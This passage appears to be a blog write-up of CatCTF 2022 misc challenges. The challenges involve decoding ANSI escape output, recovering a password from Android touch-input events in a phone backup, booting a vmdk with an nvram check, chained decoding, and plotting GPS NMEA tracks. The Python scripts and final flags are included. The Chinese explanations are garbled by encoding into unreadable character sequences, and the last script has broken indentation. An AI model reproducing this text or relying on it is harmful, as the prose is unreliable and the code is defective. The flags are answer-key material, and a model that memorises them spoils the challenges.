<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ANSI_escape_code" title="https://en.wikipedia.org/wiki/ANSI_escape_code">https://en.wikipedia.org/wiki/ANSI_escape_code</a></p>
<p>æ§åˆ¶å…‰æ ‡çš„ç§»åŠ¨ï¼Œè¾“å‡ºéšæœºå­—ç¬¦ï¼Œè¾“å‡ºçš„é‡è¶³å¤Ÿå¤šå°±ä¼šæœ‰åŠ¨æ€æ•ˆæœ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">FILE = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeThings</span>(<span class="params">b</span>):</span><br><span class="line">    FILE.write(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MoveLeft</span>(<span class="params">n=<span class="number">1</span></span>):</span><br><span class="line">    writeThings(<span class="string">b&#x27;\x1b[C&#x27;</span>*n)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MoveRight</span>(<span class="params">n=<span class="number">1</span></span>):</span><br><span class="line">    writeThings(<span class="string">b&#x27;\x1b[D&#x27;</span>*n)</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&#x27; CatCTF&#123;!2023_Will_Be_Special,2022_Was_Not!&#125; &#x27;</span></span><br><span class="line"><span class="comment">#flagå½©è›‹ï¼šhttps://thwiki.cc/%E6%98%8E%E6%97%A5%E4%B9%8B%E7%9B%9B%EF%BC%8C%E6%98%A8%E6%97%A5%E4%B9%8B%E4%BF%97</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">COUNT = <span class="number">2022234</span></span><br><span class="line">randpos=[random.randint(<span class="number">0</span>,<span class="built_in">len</span>(FLAG)-<span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(COUNT)]</span><br><span class="line">randchar = [random.randint(<span class="number">0x20</span>,<span class="number">0x7e</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(COUNT)]</span><br><span class="line"><span class="comment"># adjust char</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(FLAG)):</span><br><span class="line">    pos = COUNT</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(COUNT-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(randpos[j] == i):</span><br><span class="line">            pos = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    randchar[pos] = FLAG[i]</span><br><span class="line">    </span><br><span class="line">writeThings(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">POS = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(COUNT):</span><br><span class="line">    <span class="keyword">if</span>(randpos[i] &gt; POS):</span><br><span class="line">        MoveLeft(randpos[i]-POS)</span><br><span class="line">    <span class="keyword">elif</span>(randpos[i] &lt; POS):</span><br><span class="line">        MoveRight(POS-randpos[i])</span><br><span class="line">    writeThings(<span class="built_in">bytearray</span>([randchar[i]]))</span><br><span class="line">    POS = randpos[i]+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">writeThings(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PS2ï¼šå½©è›‹</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-03-00-45-27_sbSpLUOrWH.png" class="">

<h3 id="CatPaw"><a href="#CatPaw" class="headerlink" title="CatPaw"></a>CatPaw</h3><p>è¿™æ˜¯ä½œä¸ºMiscçš„å‹è½´é¢˜å‡ºçš„ï¼Œéš¾åº¦è¾ƒå¤§ï¼ˆLunaticï¼‰</p>
<p>åˆ†ææ–‡ä»¶ï¼Œè§‚å¯Ÿåˆ°æ˜¯å°ç±³æ‰‹æœºçš„å¤‡ä»½æ–‡ä»¶ï¼Œå®é™…ä¹Ÿæ˜¯ANDROID BACKUPæ–‡ä»¶ï¼Œå»æ‰å°ç±³çš„header</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-09-15-41-35_KUIi2qunIN.png" class="">

<p><a target="_blank" rel="noopener" href="https://github.com/nelenkov/android-backup-extractor" title="https://github.com/nelenkov/android-backup-extractor">https://github.com/nelenkov/android-backup-extractor</a> è§£å‹</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-09-15-40-49_35ThyeGMD8.png" class="">

<p>åˆ†æapk ï¼Œå¯ä»¥çœ‹åˆ°è¾“å…¥çš„å¯†ç md5 hashæ˜¯8b9b0ad9c324204fac87ae0fc2c630bd</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-09-15-57-01_YNiepPfq5y.png" class="">

<p>åˆ†ælibå‡½æ•°ï¼Œå‘ç°æ²¡æœ‰å®é™…çš„è°ƒç”¨ï¼Œæœ‰å‡½æ•° æ‰“å¼€å¹¶è¯»å–æ–‡ä»¶ â€œ&#x2F;dev&#x2F;input&#x2F;event1â€ åˆ°è‡ªå·±çš„ç›®å½•ä¸‹</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-09-15-58-47_iaBPkH1zzp.png" class="">

<p>åˆ†æ ef&#x2F;1666666666 å‘ç°ç»“æ„æ˜¯24byte å¯¹é½</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-09-16-07-15_G0DByG2R2Y.png" class="">

<p>æå‡ºæ‰€æœ‰æ•°æ®ï¼Œç»“åˆevent structç»“æ„ä½“ï¼Œå¤§è‡´çŒœæµ‹</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-22-05-18_d9WvakdFF2.png" class="">

<p>53ï¼Œ54å¯¹åº”Xï¼ŒYï¼Œ58ä¸”å€¼ä¸º1000ä¸ºæŒ‰ä¸‹ï¼Œæå‡ºæ‰€æœ‰çš„æŒ‰é”®</p>
<p>è¿™é‡Œæœ‰é€‰æ‰‹ç¿»åˆ°äº†kernelåº•å±‚æºç è§£æeventç»“æ„ä½“</p>
<p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/input/input.txt" title="https://www.kernel.org/doc/Documentation/input/input.txt">https://www.kernel.org/doc/Documentation/input/input.txt</a></p>
<p><a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h" title="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h</a></p>
<p>è¾“å…¥å¯†ç æ—¶éƒ½ä¼šå¼¹å‡ºå®‰å…¨é”®ç›˜ï¼Œå› ä¸ºæ˜¯å°ç±³çš„å¤‡ä»½æ–‡ä»¶ï¼Œå¯»æ‰¾å°ç±³å®‰å…¨é”®ç›˜å¸ƒå±€ï¼Œèƒ½æ‰¾åˆ°ä¸€ä¸ª</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/keyboard_obml2LP1Jv.png" class="">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont </span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">1080</span>, <span class="number">2200</span>), <span class="string">&quot;#00000000&quot;</span>)</span><br><span class="line">image =Image.<span class="built_in">open</span>(<span class="string">&quot;keyboard.png&quot;</span>)</span><br><span class="line">draw = ImageDraw.Draw(image)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawText</span>(<span class="params">x,y,text</span>):</span><br><span class="line">    draw.text((x,y+<span class="number">100</span>),text,(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),text_size = <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cropImage</span>(<span class="params">x,y,<span class="built_in">id</span></span>):</span><br><span class="line">    y=y+<span class="number">100</span></span><br><span class="line">    S = <span class="number">50</span></span><br><span class="line">    xa = x - S</span><br><span class="line">    ya = y - S</span><br><span class="line">    xb = x + S</span><br><span class="line">    yb = y + S</span><br><span class="line">    <span class="keyword">if</span>(xa &lt; <span class="number">0</span>):</span><br><span class="line">        xb -= xa</span><br><span class="line">        xa = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span>(xb &gt; <span class="number">1080</span>):</span><br><span class="line">        xa -= (xb-<span class="number">1080</span>)</span><br><span class="line">        xb = <span class="number">1080</span></span><br><span class="line">    <span class="keyword">if</span>(ya &lt; <span class="number">0</span>):</span><br><span class="line">        yb -= ya</span><br><span class="line">        ya = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span>(yb &gt; <span class="number">2200</span>):</span><br><span class="line">        ya -= (yb - <span class="number">2200</span>)</span><br><span class="line">        yb = <span class="number">2200</span></span><br><span class="line">    crop = image.crop((xa,ya,xb,yb))</span><br><span class="line">    crop.save(<span class="string">&quot;./keys/%d.png&quot;</span>%<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1666666666&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">X = <span class="number">0</span></span><br><span class="line">Y = <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(offset &lt; <span class="built_in">len</span>(data)):</span><br><span class="line">    result = struct.unpack_from(<span class="string">&quot;&lt;QQHHi&quot;</span>,data,offset)</span><br><span class="line">    offset += struct.calcsize(<span class="string">&quot;&lt;QQHHi&quot;</span>)</span><br><span class="line">    <span class="comment"># 53 X 54 Y</span></span><br><span class="line">    <span class="keyword">if</span>(result[<span class="number">3</span>] == <span class="number">58</span> <span class="keyword">and</span> result[<span class="number">4</span>] == <span class="number">1000</span>):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="comment">#drawText(X,Y,str(count))</span></span><br><span class="line">        cropImage(X,Y,count)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">if</span>(result[<span class="number">3</span>] == <span class="number">53</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;X&#x27;</span>,result[<span class="number">4</span>],end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        X = result[<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span>(result[<span class="number">3</span>] == <span class="number">54</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Y&#x27;</span>,result[<span class="number">4</span>],end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        Y = result[<span class="number">4</span>]</span><br><span class="line">        </span><br><span class="line">image.save(<span class="string">&quot;./test.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/2022-12-15-00-56-08_YYxnivMVZg.png" class="">

<p>å‘ç°ä¼šè¾“å…¥ç¬¦å·ï¼Œå¤§å°å†™ï¼Œå®‰å…¨é”®ç›˜çš„ç¬¦å·å¸ƒå±€æ€ä¹ˆæ?</p>
<p>å¤§å°å†™å¯ä»¥è§‚å¯ŸCatCTFçš„è¾“å…¥ï¼Œè¾“å…¥å­—æ¯æ—¶Shiftä¸ä¼šç­ï¼Œæœ‰2ä½é€‰æ‰‹æœ€åå¡åœ¨äº†è¿™é‡Œï¼Œ</p>
<p><code>CatCTF&#123;the_C4t_!5_REc0rdiN9_$cr34n_by_inPUt_evEN7&#125;</code></p>
<p>æ²¡æœ‰åˆ†ææ¸…æ¥šå¤§å°å†™è§„å¾‹ï¼Œé—æ†¾</p>
<h4 id="1-æ‹¥æœ‰å°ç±³æ‰‹æœºï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„ç¬¦å·å¸ƒå±€"><a href="#1-æ‹¥æœ‰å°ç±³æ‰‹æœºï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„ç¬¦å·å¸ƒå±€" class="headerlink" title="1. æ‹¥æœ‰å°ç±³æ‰‹æœºï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„ç¬¦å·å¸ƒå±€"></a>1. æ‹¥æœ‰å°ç±³æ‰‹æœºï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„ç¬¦å·å¸ƒå±€</h4><p>æ°å¥½æœ‰å°ç±³æ‰‹æœºç¡®å®å¯ä»¥å·é¸¡</p>
<h4 id="2-å¯»æ‰¾å°ç±³å®‰å…¨é”®ç›˜çš„ç¬¦å·å¸ƒå±€"><a href="#2-å¯»æ‰¾å°ç±³å®‰å…¨é”®ç›˜çš„ç¬¦å·å¸ƒå±€" class="headerlink" title="2.å¯»æ‰¾å°ç±³å®‰å…¨é”®ç›˜çš„ç¬¦å·å¸ƒå±€"></a>2.å¯»æ‰¾å°ç±³å®‰å…¨é”®ç›˜çš„ç¬¦å·å¸ƒå±€</h4><p>æ²¡æœ‰å°ç±³æ‰‹æœºå¥½åƒå¾ˆéš¾çš„æ ·å­ï¼Œå‡ºé¢˜äººæ²¡æ‰¾åˆ°</p>
<h4 id="3-åˆç†çŒœæµ‹"><a href="#3-åˆç†çŒœæµ‹" class="headerlink" title="3.åˆç†çŒœæµ‹"></a>3.åˆç†çŒœæµ‹</h4><p>ç¬¦å·p å‡ºç°æ¬¡æ•°å¾ˆå¤šï¼ŒçŒœæµ‹ _</p>
<p><code>CatCTF&#123;the_C4t_ 5_Rec0rdiN9_ cr33n_by_inPut_evEn7&#125;</code></p>
<p>å‘ç°åªå·®2ä¸ªï¼Œçˆ†ç ´md5å°±èƒ½å‡ºäº† æˆ–è€…æ ¹æ®è¯­ä¹‰æ¨æµ‹å‡º ! $</p>
<p><code>CatCTF&#123;the_C4t_!5_Rec0rdiN9_$cr33n_by_inPut_evEn7&#125;</code></p>
<h4 id="4-é‡æ”¾"><a href="#4-é‡æ”¾" class="headerlink" title="4.é‡æ”¾?"></a>4.é‡æ”¾?</h4><p>æœªæ›¾è®¾æƒ³çš„é“è·¯ï¼Œå†™å…¥åˆ° &#x2F;dev&#x2F;input&#x2F;event1 åº”è¯¥å¯è¡Œ?</p>
<p>è¦æ±‚å°ç±³ä¸”åŒå‹å·åŒå±å¹•å¤§å°æ‰‹æœºï¼Œå¾ˆéš¾çš„è¾£ï¼Œä¸è¿‡ç¡®å®æœ‰é€‰æ‰‹å°è¯•äº†ï¼Œå¹¶ä¸”æ‰“å‡ºäº†CatC</p>
<p>ç„¶åæç¤ºinvalid argument</p>
<p>çŒœæµ‹æ˜¯ä¸€æ¬¡æ•°æ®å¤ªå¤šï¼Œå»ºè®®å°è¯•ä¸‹åˆ†æ®µå†™å…¥</p>
<p>ï¼ˆç„¶åè¿™åé€‰æ‰‹äº‹åé€šè¿‡è¯»å–æ•°æ®adb shell inputé‡æ”¾äº†ï¼Œä¹Ÿæ˜¯å‰å®³ï¼‰</p>
<p>ä¹Ÿæœ‰é€‰æ‰‹å°è¯•åœ¨æ¨¡æ‹Ÿå™¨ä¸Šé‡æ”¾ï¼Œå‡ºç°äº†é”™è¯¯ï¼Œå…·ä½“åŸå› æœªéªŒè¯</p>
<h3 id="CatJump"><a href="#CatJump" class="headerlink" title="CatJump"></a>CatJump</h3><h4 id="å‰è¨€-1"><a href="#å‰è¨€-1" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>å‡ºé¢˜5å¤©ï¼Œè¢«ç§’åŠå°æ—¶ï¼Œå½“æ—¶åšç¯å¢ƒçš„æ—¶å€™æ•°æ®å¿˜äº†æ¸…å¹²å‡€ï¼Œå¯¼è‡´è¢«éé¢„æœŸäº†ï¼ŒåŸæœ¬æŒºæœ‰è¶£çš„é¢˜ç›®æ²¡å¤šå°‘äººç©åˆ°ã€‚ æ„Ÿå…´è¶£çš„å¸ˆå‚…åç»­ä¹Ÿå¯ä»¥è¯•è¯•åŸæœ‰çš„è§£é¢˜æ€è·¯ï¼Œå¸Œæœ›å¯ä»¥ç»™å„ä½æœ‰äº›å¸®åŠ©ã€‚</p>
<h4 id="å‡ºé¢˜çµæ„Ÿæ¥æº"><a href="#å‡ºé¢˜çµæ„Ÿæ¥æº" class="headerlink" title="å‡ºé¢˜çµæ„Ÿæ¥æº"></a>å‡ºé¢˜çµæ„Ÿæ¥æº</h4><ol>
<li>ä¸€ç›´åœ¨ç©é»‘è‹¹æœï¼Œè™½ç„¶11ä»£intelå·²ç»æ˜¯é»‘æœçš„ç»å”±äº†ï¼Œä½†ä¸­é—´çš„ä¸€äº›æ€è·¯å€’æ˜¯å¾ˆæœ‰æ„æ€çš„ã€‚</li>
<li>å®‰è£…é»‘æœçš„é‡ç‚¹å°±åœ¨äºç¡¬ä»¶èƒ½å¦è¢«è‹¹æœç³»ç»Ÿè¯†åˆ«ï¼Œå› æ­¤å°±æœ‰äº†æœ¬é¢˜ï¼Œå¤§è‡´å°±æ˜¯é€šè¿‡æ£€æµ‹ç³»ç»Ÿçš„ç¡¬ä»¶é…ç½®ï¼Œå®ç°ä¸€ä¸ªç®€å•çš„macOSæ£€æµ‹æœºåˆ¶ã€‚</li>
<li>é€‰æ‰‹éœ€è¦é€šè¿‡ocæˆ–è€…å…¶ä»–æ–¹å¼ä¿®æ”¹nvramä¸­çš„å†…å®¹ï¼Œè®©ç¨‹åºè¯†åˆ«åˆ°è¯¥ç³»ç»Ÿçš„æŸäº›é…ç½®ã€‚</li>
</ol>
<h4 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h4><p>å½“æ—¶é¢„è®¾äº†2ç§è§£é¢˜æ–¹å¼</p>
<h4 id="è§£é¢˜æ€è·¯1"><a href="#è§£é¢˜æ€è·¯1" class="headerlink" title="è§£é¢˜æ€è·¯1"></a>è§£é¢˜æ€è·¯1</h4><ol>
<li>æ‹¿vmdkæ–‡ä»¶ï¼Œæå–å…¶ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œåˆ†æï¼Œæœ€ç»ˆé”å®šopensslè§£å¯†çš„éƒ¨åˆ†ï¼Œåˆ©ç”¨é¢˜ç›®æè¿°ä¸­çš„ã€Œcat_jumpã€è¿›è¡Œè§£å¯†è·å¾—flagã€‚</li>
</ol>
<h4 id="è§£é¢˜æ€è·¯2"><a href="#è§£é¢˜æ€è·¯2" class="headerlink" title="è§£é¢˜æ€è·¯2"></a>è§£é¢˜æ€è·¯2</h4><p>æ‹¿åˆ°vmdkï¼Œè¿›è¡Œä»¿çœŸæŒ‚è½½ï¼Œä½†å‘ç°è¯¥ç£ç›˜æ— æ³•åœ¨ubuntuç­‰é¢„è®¾ä¸­è¿›è¡ŒæŒ‚è½½ï¼Œå› ä¸ºè¿™é‡Œç”¨çš„æ˜¯Alpine Linuxï¼Œå¹¶ä¸”æ˜¯Alpineæ˜¯UEFIï¼ŒVmwareä¸­ä¸€èˆ¬éƒ½æ˜¯bioså¼•å¯¼å¯åŠ¨ï¼Œå¦‚æœæ˜¯vmware workstationçš„è¯éœ€è¦åœ¨åˆ›å»ºå®Œæ¯•åï¼Œé«˜çº§ä¸­è®¾ç½®ä¸ºUEFIå¯åŠ¨ï¼Œå³å¯è¿›å…¥æ¸¸æˆã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727257912564_M53gte1GHd.jpg" class="">

<p>è¿›å…¥æ¸¸æˆåï¼Œè¿™é‡Œæœ‰ä¸ªå°è„‘æ´ï¼Œä¸€èˆ¬çš„æ¸¸æˆéƒ½ä¼šæœ‰ã€Œé€€å‡ºã€æ¨¡å—ï¼Œä¸€èˆ¬ä¸ºã€Œqã€ï¼Œä½†è¿™é‡Œç”¨çš„æ˜¯ã€Œ]ã€ï¼Œé€€å‡ºåå³å¯å‘ç°è¯»å–æ–‡ä»¶å¤±è´¥äº†ã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727258094705_G4mqRjXCyX.jpg" class="">

<p>è¯»å–çš„æ˜¯nvramä¸­çš„ä¸€ä¸ªç‰¹å®šå˜é‡ï¼Œå¦‚æ— æ³•æ£€æµ‹åˆ°è¿™ä¸ªå˜é‡çš„è¯ï¼Œå³ä½¿è¿›äº†ç³»ç»Ÿç™»å½•ç•Œé¢ä¹Ÿæ— æµäºäº‹ã€‚</p>
<p>é€šè¿‡opencoreåšä¸€ä¸ªå¼•å¯¼é©±åŠ¨ï¼Œåœ¨nvramä¸­å†™å…¥æŠ¥é”™ä¸­çš„ç‰¹å®šå˜é‡åå’Œå˜é‡å€¼ï¼Œå°†è¯¥å¼•å¯¼æŒ‚è½½åˆ°è™šæ‹Ÿæœºä¸­ï¼Œæˆ‘è¿™ç›´æ¥ç”¨çš„Uç›˜åˆ›äº†ä¸ªESPåˆ†åŒºï¼ŒæŠŠEFIä¸¢è¿›å»äº†ã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727259978933_9DGf9SkdmT.jpg" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/16727273192363_Hp2xaNCv6E.jpg" class="">

<p>å¦‚æœUç›˜æ˜¯USB3.1çš„è®°å¾—æ”¹ä¸‹å…¼å®¹æ€§</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727273895670_7O4huPDria.jpg" class="">

<p>å¯åŠ¨åˆ°å›ºä»¶åï¼Œé€‰æ‹©opencoreå¯åŠ¨ï¼Œè¿™æ ·EFIå¼•å¯¼å°±æ˜¯èµ°çš„opencoreï¼Œæ¨¡æ‹Ÿå‡ºçš„nvramä¹Ÿå°±èƒ½è·å–åˆ°ã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727274136847_ziBLJihTah.jpg" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/16727274275381_0KMCb0M7e3.jpg" class="">

<p>æœ€ç»ˆè¿›å…¥å¯åŠ¨ç•Œé¢å³å¯è·å–flagã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/16727274418685_OZSTGT6olj.jpg" class="">

<h4 id="è§£é¢˜æ€è·¯3ï¼ˆéé¢„æœŸï¼‰"><a href="#è§£é¢˜æ€è·¯3ï¼ˆéé¢„æœŸï¼‰" class="headerlink" title="è§£é¢˜æ€è·¯3ï¼ˆéé¢„æœŸï¼‰"></a>è§£é¢˜æ€è·¯3ï¼ˆéé¢„æœŸï¼‰</h4><ol>
<li>strings cat_jump_clean.vmdk | grep CatCTF{</li>
<li>010ç¼–è¾‘æœç´¢</li>
<li>å–è¯å¤§å¸ˆæå–åŸå§‹æ•°æ®</li>
<li>è®°äº‹æœ¬æ‰“å¼€</li>
<li>â€¦..</li>
</ol>
<p>æ€»ä¹‹å°±æ˜¯ç£ç›˜æ•°æ®æ²¡æ¸…å¹²å‡€ï¼Œè¢«ä¸€æŠŠæ¢­äº†ã€‚</p>
<h3 id="CatCat"><a href="#CatCat" class="headerlink" title="CatCat"></a>CatCat</h3><p>rabbitè§£å¯†ï¼Œå¯†é’¥åœ¨å›¾ç‰‡ä¸­ä½¿ç”¨stringsæœç´¢passwordå³å¯æ‰¾åˆ°</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/1672763715868_Ixujs6YJde.png" class="">

<p>å°†è§£å¯†ç»“æœé‡‡ç”¨base91è§£å¯†ï¼Œé‡‡ç”¨åœ¨çº¿ç½‘ç«™(<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/brainfuck" title="https://ctf.bugku.com/tool/brainfuck">https://ctf.bugku.com/tool/brainfuck</a>)è½¬æ¢Ookï¼Œæœ€åè§£å¯†å³å¯</p>
<p>CatCTF{Th1s_V3ry_cute_catcat!!!}</p>
<h3 id="CatchCat"><a href="#CatchCat" class="headerlink" title="CatchCat"></a>CatchCat</h3><p>é¢˜ç›®é™„ä»¶ç»™å‡ºçš„æ˜¯GPSçš„NMEAæ ¼å¼è½¨è¿¹æ•°æ®</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_vCasnHhDRI.png" class="">

<p>æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯NMEAè½¬KMLå¯è§†åŒ–è¿˜åŸGPSè½¨è¿¹</p>
<p><a target="_blank" rel="noopener" href="https://www.h-schmidt.net/NMEA/" title="https://www.h-schmidt.net/NMEA/">https://www.h-schmidt.net/NMEA/</a></p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_iXZu0a3L1-.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/image_XEtj08zH_I.png" class="">

<p>NMEAè½¬KMLä¹‹åå†å¯è§†åŒ–å°±å¯ä»¥äº†</p>
<p><a target="_blank" rel="noopener" href="https://mygeodata.cloud/converter/" title="https://mygeodata.cloud/converter/">https://mygeodata.cloud/converter/</a></p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_uyL446C1JK.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/image_JT4arjVZpH.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/image_nJqvtBCn_5.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/image_e3sSc1hTkc.png" class="">

<p>ä¸ºäº†æ–¹ä¾¿å¤§å®¶è¯†åˆ«ï¼Œè¿™é‡Œå¤§å¤§ç¼©çŸ­äº†flagçš„å†…å®¹ã€‚</p>
<p>CatCTF{GPS_M1ao}</p>
<p>å¦å¤–ä¸€ç§æ–¹æ³•å°±æ˜¯å†™è„šæœ¬æå–æ•°æ®è¿˜åŸGPSè½¨è¿¹ï¼Œå¤§å®¶æ ¹æ®è‡ªå·±çš„å–œå¥½æ¥è§£å†³å°±å¥½å•¦ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;CatchCat.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line"></span><br><span class="line">x = []</span><br><span class="line"></span><br><span class="line">y = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> line.strip():</span><br><span class="line"></span><br><span class="line">  d1, d2 = <span class="built_in">float</span>(line[<span class="number">17</span>:<span class="number">30</span>]), <span class="built_in">float</span>(line[<span class="number">33</span>:<span class="number">47</span>])</span><br><span class="line"></span><br><span class="line">  x.append(d1)</span><br><span class="line"></span><br><span class="line">  y.append(d2)</span><br><span class="line"></span><br><span class="line">plt.scatter(x,y)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
